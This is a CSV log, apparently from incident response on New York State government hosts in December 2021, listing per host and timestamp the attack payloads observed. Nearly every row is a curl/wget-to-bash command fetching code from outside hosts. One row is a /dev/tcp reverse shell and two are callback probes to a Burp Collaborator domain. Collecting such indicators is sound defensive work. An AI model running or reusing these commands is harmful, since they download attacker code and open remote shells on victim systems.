host,earliest,payload
dch1746pl5app,12/10/2021 14:37:12,(curl -s 45.155.205.233:5874/34.120.255.218:443||wget -q -O- 45.155.205.233:5874/34.120.255.218:443)|bash
dch1746pl5app,12/10/2021 14:40:12,(curl -s 45.155.205.233:5874/34.107.147.28:443||wget -q -O- 45.155.205.233:5874/34.107.147.28:443)|bash
dch1746pl5app,12/10/2021 14:40:24,(curl -s 45.155.205.233:5874/34.117.200.21:443||wget -q -O- 45.155.205.233:5874/34.117.200.21:443)|bash
dch1746pl5app,12/10/2021 14:40:24,(curl -s 45.155.205.233:5874/34.117.200.39:443||wget -q -O- 45.155.205.233:5874/34.117.200.39:443)|bash
dch1746pl5app,12/10/2021 14:41:33,(curl -s 45.155.205.233:5874/34.117.154.216:443||wget -q -O- 45.155.205.233:5874/34.117.154.216:443)|bash
dch1746pl5app,12/10/2021 14:41:40,(curl -s 45.155.205.233:5874/34.120.126.80:443||wget -q -O- 45.155.205.233:5874/34.120.126.80:443)|bash
dch1746pl5app,12/10/2021 17:53:48,(curl -s 45.155.205.233:5874/34.120.136.45:80||wget -q -O- 45.155.205.233:5874/34.120.136.45:80)|bash
dch1746pl5app,12/10/2021 17:54:01,(curl -s 45.155.205.233:5874/34.117.37.153:80||wget -q -O- 45.155.205.233:5874/34.117.37.153:80)|bash
dch1746pl5app,12/10/2021 17:55:05,(curl -s 45.155.205.233:5874/35.244.242.56:80||wget -q -O- 45.155.205.233:5874/35.244.242.56:80)|bash
dch1746pl5app,12/10/2021 17:56:52,(curl -s 45.155.205.233:5874/35.190.69.251:80||wget -q -O- 45.155.205.233:5874/35.190.69.251:80)|bash
dch1746pl5app,12/10/2021 17:58:48,(curl -s 45.155.205.233:5874/34.120.255.218:80||wget -q -O- 45.155.205.233:5874/34.120.255.218:80)|bash
dch1746pl5app,12/10/2021 18:03:28,(curl -s 45.155.205.233:5874/130.211.23.104:80||wget -q -O- 45.155.205.233:5874/130.211.23.104:80)|bash
dch1746pl5app,12/10/2021 18:08:20,(curl -s 45.155.205.233:5874/34.117.126.43:80||wget -q -O- 45.155.205.233:5874/34.117.126.43:80)|bash
dch1746pl5app,12/10/2021 18:09:12,(curl -s 45.155.205.233:5874/34.117.138.174:80||wget -q -O- 45.155.205.233:5874/34.117.138.174:80)|bash
dch1746pl5app,12/10/2021 18:09:52,(curl -s 45.155.205.233:5874/34.120.117.72:80||wget -q -O- 45.155.205.233:5874/34.120.117.72:80)|bash
dch1746pl5app,12/10/2021 18:13:05,(curl -s 45.155.205.233:5874/34.117.238.254:80||wget -q -O- 45.155.205.233:5874/34.117.238.254:80)|bash
dch1746pl5app,12/10/2021 18:16:17,(curl -s 45.155.205.233:5874/35.201.116.103:80||wget -q -O- 45.155.205.233:5874/35.201.116.103:80)|bash
dch1746pl5app,12/10/2021 18:19:42,(curl -s 45.155.205.233:5874/34.117.48.251:80||wget -q -O- 45.155.205.233:5874/34.117.48.251:80)|bash
dch1746pl5app,12/10/2021 18:20:13,(curl -s 45.155.205.233:5874/34.117.150.208:80||wget -q -O- 45.155.205.233:5874/34.117.150.208:80)|bash
dch1746pl5app,12/10/2021 18:21:55,(curl -s 45.155.205.233:5874/35.244.169.16:80||wget -q -O- 45.155.205.233:5874/35.244.169.16:80)|bash
dch1746pl5app,12/10/2021 18:23:27,(curl -s 45.155.205.233:5874/34.107.190.113:80||wget -q -O- 45.155.205.233:5874/34.107.190.113:80)|bash
dch1746pl5app,12/10/2021 18:24:20,(curl -s 45.155.205.233:5874/35.201.66.245:80||wget -q -O- 45.155.205.233:5874/35.201.66.245:80)|bash
dch1746pl5app,12/10/2021 18:25:06,(curl -s 45.155.205.233:5874/34.117.52.104:80||wget -q -O- 45.155.205.233:5874/34.117.52.104:80)|bash
dch1746pl5app,12/10/2021 18:26:15,(curl -s 45.155.205.233:5874/35.227.202.38:80||wget -q -O- 45.155.205.233:5874/35.227.202.38:80)|bash
dch1746pl5app,12/10/2021 18:32:06,(curl -s 45.155.205.233:5874/35.241.0.112:443||wget -q -O- 45.155.205.233:5874/35.241.0.112:443)|bash
dch1746pl5app,12/10/2021 18:33:32,(curl -s 45.155.205.233:5874/34.117.157.101:443||wget -q -O- 45.155.205.233:5874/34.117.157.101:443)|bash
dch1746pl5app,12/10/2021 18:34:04,(curl -s 45.155.205.233:5874/34.117.3.254:443||wget -q -O- 45.155.205.233:5874/34.117.3.254:443)|bash
dch1746pl5app,12/10/2021 18:35:01,(curl -s 45.155.205.233:5874/35.244.255.103:443||wget -q -O- 45.155.205.233:5874/35.244.255.103:443)|bash
dch1746pl5app,12/10/2021 18:35:37,(curl -s 45.155.205.233:5874/34.117.232.66:443||wget -q -O- 45.155.205.233:5874/34.117.232.66:443)|bash
dch1746pl5app,12/10/2021 18:35:54,(curl -s 45.155.205.233:5874/34.117.245.197:443||wget -q -O- 45.155.205.233:5874/34.117.245.197:443)|bash
dch1746pl5app,12/10/2021 18:37:12,(curl -s 45.155.205.233:5874/34.117.52.158:443||wget -q -O- 45.155.205.233:5874/34.117.52.158:443)|bash
dch1746pl5app,12/10/2021 18:38:54,(curl -s 45.155.205.233:5874/34.107.140.86:443||wget -q -O- 45.155.205.233:5874/34.107.140.86:443)|bash
dch1746pl5app,12/10/2021 18:39:12,(curl -s 45.155.205.233:5874/34.102.201.36:443||wget -q -O- 45.155.205.233:5874/34.102.201.36:443)|bash
dch1746pl5app,12/10/2021 18:41:18,(curl -s 45.155.205.233:5874/34.120.23.100:443||wget -q -O- 45.155.205.233:5874/34.120.23.100:443)|bash
dch1746pl5app,12/10/2021 18:42:53,(curl -s 45.155.205.233:5874/34.117.42.241:443||wget -q -O- 45.155.205.233:5874/34.117.42.241:443)|bash
dch1746pl5app,12/10/2021 18:46:01,(curl -s 45.155.205.233:5874/34.107.190.113:443||wget -q -O- 45.155.205.233:5874/34.107.190.113:443)|bash
dch1746pl5app,12/10/2021 18:46:53,(curl -s 45.155.205.233:5874/35.227.237.177:443||wget -q -O- 45.155.205.233:5874/35.227.237.177:443)|bash
dch1746pl5app,12/10/2021 18:48:43,(curl -s 45.155.205.233:5874/34.98.75.221:443||wget -q -O- 45.155.205.233:5874/34.98.75.221:443)|bash
dch1746pl5app,12/10/2021 18:52:14,(curl -s 45.155.205.233:5874/34.117.140.146:443||wget -q -O- 45.155.205.233:5874/34.117.140.146:443)|bash
dch1746pl5app,12/10/2021 18:54:30,(curl -s 45.155.205.233:5874/130.211.13.64:443||wget -q -O- 45.155.205.233:5874/130.211.13.64:443)|bash
dch1746pl5app,12/10/2021 18:55:00,(curl -s 45.155.205.233:5874/34.149.131.229:443||wget -q -O- 45.155.205.233:5874/34.149.131.229:443)|bash
dch1746pl5app,12/10/2021 18:55:59,(curl -s 45.155.205.233:5874/34.117.41.18:443||wget -q -O- 45.155.205.233:5874/34.117.41.18:443)|bash
dch1746pl5app,12/10/2021 18:59:31,(curl -s 45.155.205.233:5874/35.201.123.203:443||wget -q -O- 45.155.205.233:5874/35.201.123.203:443)|bash
dch1746pl5app,12/10/2021 19:10:22,(curl -s 45.155.205.233:5874/35.227.202.38:443||wget -q -O- 45.155.205.233:5874/35.227.202.38:443)|bash
dch1746pl5app,12/10/2021 19:10:32,(curl -s 45.155.205.233:5874/34.117.52.104:443||wget -q -O- 45.155.205.233:5874/34.117.52.104:443)|bash
dch1746pl5app,12/10/2021 19:22:50,(curl -s 45.155.205.233:5874/34.107.206.62:443||wget -q -O- 45.155.205.233:5874/34.107.206.62:443)|bash
dch1746pl5app,12/10/2021 19:24:46,(curl -s 45.155.205.233:5874/34.120.163.119:443||wget -q -O- 45.155.205.233:5874/34.120.163.119:443)|bash
dch1746pl5app,12/10/2021 19:26:03,(curl -s 45.155.205.233:5874/34.117.62.54:443||wget -q -O- 45.155.205.233:5874/34.117.62.54:443)|bash
dch1746pl5app,12/10/2021 19:26:16,(curl -s 45.155.205.233:5874/34.117.27.241:443||wget -q -O- 45.155.205.233:5874/34.117.27.241:443)|bash
dch1746pl5app,12/10/2021 19:26:27,(curl -s 45.155.205.233:5874/34.149.10.162:443||wget -q -O- 45.155.205.233:5874/34.149.10.162:443)|bash
dch1746pl5app,12/10/2021 19:26:51,(curl -s 45.155.205.233:5874/35.241.25.147:443||wget -q -O- 45.155.205.233:5874/35.241.25.147:443)|bash
dch1746pl5app,12/10/2021 19:29:46,(curl -s 45.155.205.233:5874/35.241.57.135:443||wget -q -O- 45.155.205.233:5874/35.241.57.135:443)|bash
dch1746pl5app,12/10/2021 19:30:40,(curl -s 45.155.205.233:5874/34.117.110.198:443||wget -q -O- 45.155.205.233:5874/34.117.110.198:443)|bash
dch1746pl5app,12/10/2021 19:31:44,(curl -s 45.155.205.233:5874/34.117.238.254:443||wget -q -O- 45.155.205.233:5874/34.117.238.254:443)|bash
dch1746pl5app,12/12/2021 04:49:55,(curl -s 45.155.205.233:5874/34.107.132.248:80||wget -q -O- 45.155.205.233:5874/34.107.132.248:80)|bash
dch1746pl5app,12/12/2021 04:59:51,(curl -s 45.155.205.233:5874/34.117.213.68:80||wget -q -O- 45.155.205.233:5874/34.117.213.68:80)|bash
dch1746pl5app,12/12/2021 05:08:51,(curl -s 45.155.205.233:5874/34.117.243.152:80||wget -q -O- 45.155.205.233:5874/34.117.243.152:80)|bash
dch1746pl5app,12/12/2021 05:20:15,(curl -s 45.155.205.233:5874/34.120.126.80:80||wget -q -O- 45.155.205.233:5874/34.120.126.80:80)|bash
dch1746pl5app,12/12/2021 05:20:39,(curl -s 45.155.205.233:5874/34.117.160.47:80||wget -q -O- 45.155.205.233:5874/34.117.160.47:80)|bash
dch1746pl5app,12/12/2021 05:44:22,(curl -s 45.155.205.233:5874/34.102.189.243:443||wget -q -O- 45.155.205.233:5874/34.102.189.243:443)|bash
dch1746pl5app,12/12/2021 05:55:50,(curl -s 45.155.205.233:5874/34.107.132.11:443||wget -q -O- 45.155.205.233:5874/34.107.132.11:443)|bash
dch1746pl5app,12/12/2021 06:02:40,(curl -s 45.155.205.233:5874/35.201.64.131:443||wget -q -O- 45.155.205.233:5874/35.201.64.131:443)|bash
dch1746pl5app,12/12/2021 06:14:23,(curl -s 45.155.205.233:5874/35.190.1.232:443||wget -q -O- 45.155.205.233:5874/35.190.1.232:443)|bash
dch557ql5web,12/10/2021 21:14:29,wget -q -O- http://62.210.130.250/lh.sh|bash
drupal.nyspi.local,12/10/2021 21:14:29,wget -q -O- http://62.210.130.250/lh.sh|bash
drupal.nyspi.local,12/10/2021 21:26:09,wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh
drupal.nyspi.local,12/12/2021 23:41:08,(curl -s 195.54.160.149:5874/156.111.139.58:80||wget -q -O- 195.54.160.149:5874/156.111.139.58:80)|bash
dtf005pa5htp,12/10/2021 21:01:25,curl tax.ny.gov.nb2987zdx1uyes31bfyxu29y2p8iw7.burpcollaborator.net
dtf008pa5htp,12/10/2021 21:06:59,curl www.tax.ny.gov.nb2987zdx1uyes31bfyxu29y2p8iw7.burpcollaborator.net
ent1981px5uag.svc.ny.gov,12/11/2021 10:18:47,(curl http://164.52.212.196:88/vc || wget -q -O- http://164.52.212.196:88/vc) | s
ent1990pw5vcs,12/12/2021 00:42:31,(curl -s 45.155.205.233:5874/161.11.223.199:443||wget -q -O- 45.155.205.233:5874/161.11.223.199:443)|bash
ent2030pw5vcs,12/12/2021 00:51:41,(curl -s 45.155.205.233:5874/161.11.141.145:443||wget -q -O- 45.155.205.233:5874/161.11.141.145:443)|bash
ent2044px5uag.svc.ny.gov,12/11/2021 10:18:47,(curl http://164.52.212.196:88/vc || wget -q -O- http://164.52.212.196:88/vc) | s
ent2181px5uag.svc.ny.gov,12/11/2021 10:18:47,(curl http://164.52.212.196:88/vc || wget -q -O- http://164.52.212.196:88/vc) | s
ent2554pw5vcs,12/11/2021 10:18:47,
ent2554pw5vcs,12/11/2021 10:18:47,
ent2554pw5vcs,12/12/2021 00:48:14,(curl -s 45.155.205.233:5874/161.11.142.79:443||wget -q -O- 45.155.205.233:5874/161.11.142.79:443)|bash
ent2577px5uag.svc.ny.gov,12/11/2021 10:18:47,(curl http://164.52.212.196:88/vc || wget -q -O- http://164.52.212.196:88/vc) | s
ent861pw5vcs,12/12/2021 01:00:36,(curl -s 45.155.205.233:5874/161.11.222.30:443||wget -q -O- 45.155.205.233:5874/161.11.222.30:443)|bash
ent893px5vsa,12/11/2021 10:18:47,(curl http://164.52.212.196:88/vc || wget -q -O- http://164.52.212.196:88/vc) | s
ent896px5vsa,12/11/2021 10:18:47,(curl http://164.52.212.196:88/vc || wget -q -O- http://164.52.212.196:88/vc) | s
mda.its.ny.gov,12/11/2021 00:10:09,bash -i>&/dev/tcp/103.238.225.37/8080 0>&1
nyspi_internalsites.nyspi.local,12/10/2021 08:14:36,(curl -s 45.155.205.233:5874/35.153.151.76:80||wget -q -O- 45.155.205.233:5874/35.153.151.76:80)|bash
nyspi_internalsites.nyspi.local,12/10/2021 08:56:42,(curl -s 45.155.205.233:5874/35.153.151.76:443||wget -q -O- 45.155.205.233:5874/35.153.151.76:443)|bash
nyspi_internalsites.nyspi.local,12/10/2021 09:19:37,(curl -s 45.155.205.233:5874/52.0.114.248:443||wget -q -O- 45.155.205.233:5874/52.0.114.248:443)|bash
nyspi_internalsites.nyspi.local,12/10/2021 21:26:09,wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh
sds0299ql5web,12/10/2021 08:30:26,(curl -s 45.155.205.233:5874/161.11.222.168:80||wget -q -O- 45.155.205.233:5874/161.11.222.168:80)|bash
sds0299ql5web,12/10/2021 08:53:50,(curl -s 45.155.205.233:5874/161.11.222.168:443||wget -q -O- 45.155.205.233:5874/161.11.222.168:443)|bash
sds0299ql5web,12/12/2021 23:47:00,(curl -s 195.54.160.149:5874/161.11.222.168:80||wget -q -O- 195.54.160.149:5874/161.11.222.168:80)|bash
sds0300ql5web,12/10/2021 08:30:26,(curl -s 45.155.205.233:5874/161.11.222.168:80||wget -q -O- 45.155.205.233:5874/161.11.222.168:80)|bash
sds0300ql5web,12/10/2021 08:53:50,(curl -s 45.155.205.233:5874/161.11.222.168:443||wget -q -O- 45.155.205.233:5874/161.11.222.168:443)|bash
squid04.health.state.ny.us,12/10/2021 07:57:39,(curl -s 45.155.205.233:5874/150.142.196.75:80||wget -q -O- 45.155.205.233:5874/150.142.196.75:80)|bash
squid04.health.state.ny.us,12/10/2021 07:57:43,(curl -s 45.155.205.233:5874/150.142.196.12:80||wget -q -O- 45.155.205.233:5874/150.142.196.12:80)|bash
squid04.health.state.ny.us,12/10/2021 07:57:48,(curl -s 45.155.205.233:5874/150.142.196.42:80||wget -q -O- 45.155.205.233:5874/150.142.196.42:80)|bash
squid04.health.state.ny.us,12/10/2021 07:57:48,(curl -s 45.155.205.233:5874/150.142.196.49:80||wget -q -O- 45.155.205.233:5874/150.142.196.49:80)|bash
squid04.health.state.ny.us,12/10/2021 07:57:49,(curl -s 45.155.205.233:5874/150.142.196.44:80||wget -q -O- 45.155.205.233:5874/150.142.196.44:80)|bash
squid04.health.state.ny.us,12/10/2021 07:57:50,(curl -s 45.155.205.233:5874/150.142.196.37:80||wget -q -O- 45.155.205.233:5874/150.142.196.37:80)|bash
squid04.health.state.ny.us,12/10/2021 07:57:51,(curl -s 45.155.205.233:5874/150.142.196.3:80||wget -q -O- 45.155.205.233:5874/150.142.196.3:80)|bash
squid04.health.state.ny.us,12/10/2021 08:05:02,(curl -s 45.155.205.233:5874/150.142.196.76:80||wget -q -O- 45.155.205.233:5874/150.142.196.76:80)|bash
squid04.health.state.ny.us,12/10/2021 08:05:03,(curl -s 45.155.205.233:5874/150.142.196.35:80||wget -q -O- 45.155.205.233:5874/150.142.196.35:80)|bash
squid04.health.state.ny.us,12/10/2021 13:15:27,(curl -s 45.155.205.233:5874/150.142.196.16:80||wget -q -O- 45.155.205.233:5874/150.142.196.16:80)|bash
squid04.health.state.ny.us,12/10/2021 13:26:58,(curl -s 45.155.205.233:5874/150.142.196.45:80||wget -q -O- 45.155.205.233:5874/150.142.196.45:80)|bash
squid04.health.state.ny.us,12/10/2021 13:26:58,(curl -s 45.155.205.233:5874/150.142.196.14:80||wget -q -O- 45.155.205.233:5874/150.142.196.14:80)|bash
squid04.health.state.ny.us,12/10/2021 21:26:09,wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh
squid04.health.state.ny.us,12/12/2021 00:20:21,(curl -s 45.155.205.233:5874/150.142.196.38:80||wget -q -O- 45.155.205.233:5874/150.142.196.38:80)|bash
squid04.health.state.ny.us,12/12/2021 23:38:19,(curl -s 195.54.160.149:5874/150.142.196.75:80||wget -q -O- 195.54.160.149:5874/150.142.196.75:80)|bash
squid04.health.state.ny.us,12/12/2021 23:39:07,(curl -s 195.54.160.149:5874/150.142.196.44:80||wget -q -O- 195.54.160.149:5874/150.142.196.44:80)|bash
squid04.health.state.ny.us,12/12/2021 23:40:41,(curl -s 195.54.160.149:5874/150.142.196.45:80||wget -q -O- 195.54.160.149:5874/150.142.196.45:80)|bash
squid04.health.state.ny.us,12/12/2021 23:43:09,(curl -s 195.54.160.149:5874/150.142.196.14:80||wget -q -O- 195.54.160.149:5874/150.142.196.14:80)|bash
squid04.health.state.ny.us,12/12/2021 23:44:39,(curl -s 195.54.160.149:5874/150.142.196.16:80||wget -q -O- 195.54.160.149:5874/150.142.196.16:80)|bash
squid04.health.state.ny.us,12/12/2021 23:44:47,(curl -s 195.54.160.149:5874/150.142.196.49:80||wget -q -O- 195.54.160.149:5874/150.142.196.49:80)|bash
squid04.health.state.ny.us,12/12/2021 23:45:50,(curl -s 195.54.160.149:5874/150.142.196.76:80||wget -q -O- 195.54.160.149:5874/150.142.196.76:80)|bash
squid04.health.state.ny.us,12/12/2021 23:51:18,(curl -s 195.54.160.149:5874/150.142.196.38:80||wget -q -O- 195.54.160.149:5874/150.142.196.38:80)|bash
squid04.health.state.ny.us,12/12/2021 23:52:42,(curl -s 195.54.160.149:5874/150.142.196.37:80||wget -q -O- 195.54.160.149:5874/150.142.196.37:80)|bash
squid05,12/10/2021 08:05:34,(curl -s 45.155.205.233:5874/199.184.22.35:80||wget -q -O- 45.155.205.233:5874/199.184.22.35:80)|bash
squid05,12/10/2021 08:21:38,(curl -s 45.155.205.233:5874/199.184.22.6:80||wget -q -O- 45.155.205.233:5874/199.184.22.6:80)|bash
squid05,12/10/2021 12:31:38,(curl -s 45.155.205.233:5874/199.184.28.130:8080||wget -q -O- 45.155.205.233:5874/199.184.28.130:8080)|bash
squid05,12/10/2021 12:42:36,(curl -s 45.155.205.233:5874/199.184.28.131:8080||wget -q -O- 45.155.205.233:5874/199.184.28.131:8080)|bash
squid05,12/10/2021 13:03:41,(curl -s 45.155.205.233:5874/199.184.28.2:80||wget -q -O- 45.155.205.233:5874/199.184.28.2:80)|bash
squid05,12/10/2021 13:05:08,(curl -s 45.155.205.233:5874/199.184.22.14:80||wget -q -O- 45.155.205.233:5874/199.184.22.14:80)|bash
squid05,12/10/2021 13:05:33,(curl -s 45.155.205.233:5874/199.184.22.36:80||wget -q -O- 45.155.205.233:5874/199.184.22.36:80)|bash
squid05,12/10/2021 13:06:09,(curl -s 45.155.205.233:5874/199.184.28.236:80||wget -q -O- 45.155.205.233:5874/199.184.28.236:80)|bash
squid05,12/10/2021 13:06:13,(curl -s 45.155.205.233:5874/199.184.28.235:80||wget -q -O- 45.155.205.233:5874/199.184.28.235:80)|bash
squid05,12/10/2021 13:17:24,(curl -s 45.155.205.233:5874/199.184.28.232:80||wget -q -O- 45.155.205.233:5874/199.184.28.232:80)|bash
squid05,12/10/2021 13:18:30,(curl -s 45.155.205.233:5874/199.184.28.31:80||wget -q -O- 45.155.205.233:5874/199.184.28.31:80)|bash
squid05,12/10/2021 13:18:31,(curl -s 45.155.205.233:5874/199.184.17.19:80||wget -q -O- 45.155.205.233:5874/199.184.17.19:80)|bash
squid05,12/10/2021 13:18:33,(curl -s 45.155.205.233:5874/199.184.17.17:80||wget -q -O- 45.155.205.233:5874/199.184.17.17:80)|bash
squid05,12/10/2021 13:18:34,(curl -s 45.155.205.233:5874/199.184.17.18:80||wget -q -O- 45.155.205.233:5874/199.184.17.18:80)|bash
squid05,12/10/2021 13:21:20,(curl -s 45.155.205.233:5874/199.184.28.182:80||wget -q -O- 45.155.205.233:5874/199.184.28.182:80)|bash
squid05,12/10/2021 21:14:29,wget -q -O- http://62.210.130.250/lh.sh|bash
squid05,12/10/2021 21:26:09,wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh
squid05,12/12/2021 00:09:27,(curl -s 45.155.205.233:5874/199.184.28.130:80||wget -q -O- 45.155.205.233:5874/199.184.28.130:80)|bash
squid05,12/12/2021 23:41:10,(curl -s 195.54.160.149:5874/199.184.22.36:80||wget -q -O- 195.54.160.149:5874/199.184.22.36:80)|bash
squid05,12/12/2021 23:46:10,(curl -s 195.54.160.149:5874/199.184.28.31:80||wget -q -O- 195.54.160.149:5874/199.184.28.31:80)|bash
squid05,12/12/2021 23:54:12,(curl -s 195.54.160.149:5874/199.184.28.182:80||wget -q -O- 195.54.160.149:5874/199.184.28.182:80)|bash
squid05,12/12/2021 23:56:54,(curl -s 195.54.160.149:5874/199.184.17.19:80||wget -q -O- 195.54.160.149:5874/199.184.17.19:80)|bash
syslogsrv1,12/10/2021 07:57:39,(curl -s 45.155.205.233:5874/150.142.196.75:80||wget -q -O- 45.155.205.233:5874/150.142.196.75:80)|bash
syslogsrv1,12/10/2021 07:57:43,(curl -s 45.155.205.233:5874/150.142.196.12:80||wget -q -O- 45.155.205.233:5874/150.142.196.12:80)|bash
syslogsrv1,12/10/2021 07:57:48,(curl -s 45.155.205.233:5874/150.142.196.49:80||wget -q -O- 45.155.205.233:5874/150.142.196.49:80)|bash
syslogsrv1,12/10/2021 07:57:49,(curl -s 45.155.205.233:5874/150.142.196.44:80||wget -q -O- 45.155.205.233:5874/150.142.196.44:80)|bash
syslogsrv1,12/10/2021 07:57:51,(curl -s 45.155.205.233:5874/150.142.196.3:80||wget -q -O- 45.155.205.233:5874/150.142.196.3:80)|bash
syslogsrv1,12/10/2021 08:31:56,(curl -s 45.155.205.233:5874/34.199.170.244:80||wget -q -O- 45.155.205.233:5874/34.199.170.244:80)|bash
syslogsrv1,12/10/2021 08:56:35,(curl -s 45.155.205.233:5874/150.142.196.42:443||wget -q -O- 45.155.205.233:5874/150.142.196.42:443)|bash
syslogsrv1,12/10/2021 08:56:41,(curl -s 45.155.205.233:5874/150.142.196.7:443||wget -q -O- 45.155.205.233:5874/150.142.196.7:443)|bash
syslogsrv1,12/10/2021 08:56:42,(curl -s 45.155.205.233:5874/150.142.196.48:443||wget -q -O- 45.155.205.233:5874/150.142.196.48:443)|bash
syslogsrv1,12/10/2021 08:56:43,(curl -s 45.155.205.233:5874/150.142.196.3:443||wget -q -O- 45.155.205.233:5874/150.142.196.3:443)|bash
syslogsrv1,12/10/2021 08:56:45,(curl -s 45.155.205.233:5874/150.142.196.16:443||wget -q -O- 45.155.205.233:5874/150.142.196.16:443)|bash
syslogsrv1,12/10/2021 08:56:46,(curl -s 45.155.205.233:5874/150.142.196.11:443||wget -q -O- 45.155.205.233:5874/150.142.196.11:443)|bash
syslogsrv1,12/10/2021 08:56:47,(curl -s 45.155.205.233:5874/150.142.196.1:443||wget -q -O- 45.155.205.233:5874/150.142.196.1:443)|bash
syslogsrv1,12/10/2021 08:56:48,(curl -s 45.155.205.233:5874/150.142.196.6:443||wget -q -O- 45.155.205.233:5874/150.142.196.6:443)|bash
syslogsrv1,12/10/2021 08:56:49,(curl -s 45.155.205.233:5874/150.142.196.9:443||wget -q -O- 45.155.205.233:5874/150.142.196.9:443)|bash
syslogsrv1,12/10/2021 08:56:53,(curl -s 45.155.205.233:5874/150.142.196.49:443||wget -q -O- 45.155.205.233:5874/150.142.196.49:443)|bash
syslogsrv1,12/10/2021 08:56:53,(curl -s 45.155.205.233:5874/150.142.196.25:443||wget -q -O- 45.155.205.233:5874/150.142.196.25:443)|bash
syslogsrv1,12/10/2021 08:56:55,(curl -s 45.155.205.233:5874/150.142.196.5:443||wget -q -O- 45.155.205.233:5874/150.142.196.5:443)|bash
syslogsrv1,12/10/2021 08:56:56,(curl -s 45.155.205.233:5874/150.142.196.14:443||wget -q -O- 45.155.205.233:5874/150.142.196.14:443)|bash
syslogsrv1,12/10/2021 08:56:58,(curl -s 45.155.205.233:5874/150.142.196.12:443||wget -q -O- 45.155.205.233:5874/150.142.196.12:443)|bash
syslogsrv1,12/10/2021 13:15:27,(curl -s 45.155.205.233:5874/150.142.196.16:80||wget -q -O- 45.155.205.233:5874/150.142.196.16:80)|bash
syslogsrv1,12/10/2021 13:20:24,(curl -s 45.155.205.233:5874/18.210.238.99:80||wget -q -O- 45.155.205.233:5874/18.210.238.99:80)|bash
syslogsrv1,12/10/2021 13:26:58,(curl -s 45.155.205.233:5874/150.142.196.14:80||wget -q -O- 45.155.205.233:5874/150.142.196.14:80)|bash
syslogsrv1,12/10/2021 13:47:35,(curl -s 45.155.205.233:5874/150.142.196.10:443||wget -q -O- 45.155.205.233:5874/150.142.196.10:443)|bash
syslogsrv1,12/10/2021 14:11:40,(curl -s 45.155.205.233:5874/150.142.196.76:443||wget -q -O- 45.155.205.233:5874/150.142.196.76:443)|bash
syslogsrv1,12/10/2021 14:12:42,(curl -s 45.155.205.233:5874/18.210.238.99:443||wget -q -O- 45.155.205.233:5874/18.210.238.99:443)|bash
syslogsrv1,12/12/2021 00:38:34,(curl -s 45.155.205.233:5874/150.142.196.4:443||wget -q -O- 45.155.205.233:5874/150.142.196.4:443)|bash
syslogsrv2,12/12/2021 00:58:39,(curl -s 45.155.205.233:5874/150.142.196.35:443||wget -q -O- 45.155.205.233:5874/150.142.196.35:443)|bash
syslogsrv3,12/10/2021 08:56:35,(curl -s 45.155.205.233:5874/150.142.196.42:443||wget -q -O- 45.155.205.233:5874/150.142.196.42:443)|bash
syslogsrv3,12/10/2021 08:56:41,(curl -s 45.155.205.233:5874/150.142.196.7:443||wget -q -O- 45.155.205.233:5874/150.142.196.7:443)|bash
syslogsrv3,12/10/2021 08:56:42,(curl -s 45.155.205.233:5874/150.142.196.48:443||wget -q -O- 45.155.205.233:5874/150.142.196.48:443)|bash
syslogsrv3,12/10/2021 08:56:46,(curl -s 45.155.205.233:5874/150.142.196.11:443||wget -q -O- 45.155.205.233:5874/150.142.196.11:443)|bash
syslogsrv3,12/10/2021 08:56:47,(curl -s 45.155.205.233:5874/150.142.196.1:443||wget -q -O- 45.155.205.233:5874/150.142.196.1:443)|bash
syslogsrv3,12/10/2021 08:56:48,(curl -s 45.155.205.233:5874/150.142.196.6:443||wget -q -O- 45.155.205.233:5874/150.142.196.6:443)|bash
syslogsrv3,12/10/2021 08:56:49,(curl -s 45.155.205.233:5874/150.142.196.9:443||wget -q -O- 45.155.205.233:5874/150.142.196.9:443)|bash
syslogsrv3,12/10/2021 08:56:53,(curl -s 45.155.205.233:5874/150.142.196.25:443||wget -q -O- 45.155.205.233:5874/150.142.196.25:443)|bash
syslogsrv3,12/10/2021 08:56:55,(curl -s 45.155.205.233:5874/150.142.196.5:443||wget -q -O- 45.155.205.233:5874/150.142.196.5:443)|bash
syslogsrv3,12/10/2021 13:47:35,(curl -s 45.155.205.233:5874/150.142.196.10:443||wget -q -O- 45.155.205.233:5874/150.142.196.10:443)|bash
syslogsrv3,12/12/2021 00:38:34,(curl -s 45.155.205.233:5874/150.142.196.4:443||wget -q -O- 45.155.205.233:5874/150.142.196.4:443)|bash
